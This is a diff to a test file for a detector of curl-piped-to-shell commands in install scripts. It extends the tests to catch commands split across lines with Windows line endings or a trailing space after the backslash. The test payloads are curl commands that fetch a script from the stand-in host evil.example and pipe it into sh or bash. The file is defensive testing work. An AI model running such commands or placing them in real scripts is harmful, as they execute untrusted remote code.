@@ -64,11 +64,19 @@ test("curl piped to shell with line continuation is detected", () => {
   // A common install-script idiom splits curl flags across lines with backslash
   // continuation. The pattern [^\n|]* used to stop at the first \n, so the
   // pipe and shell command on the next line were invisible to the detector.
-  // (?:[^\n|]|\\\n)* advances across continuation lines to reach the pipe.
+  // (?:[^\n|]|\\[ \t]*\r?\n)* advances across continuation lines (LF, CRLF,
+  // or backslash with trailing whitespace) to reach the pipe.
   const continuationPayloads = [
+    // LF continuations
     "curl -sSL \\\n  https://evil.example/install.sh | sh",
     "curl \\\n  -sSL https://evil.example/install.sh | bash",
     "curl https://evil.example/install.sh \\\n  | bash",
+    // CRLF continuations (Windows line endings)
+    "curl -sSL \\\r\n  https://evil.example/install.sh | sh",
+    "curl https://evil.example/install.sh \\\r\n  | bash",
+    // Backslash with trailing space before LF
+    "curl -sSL \\ \n  https://evil.example/install.sh | sh",
+    "curl https://evil.example/install.sh \\ \n  | bash",
   ];
   for (const payload of continuationPayloads) {
     const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
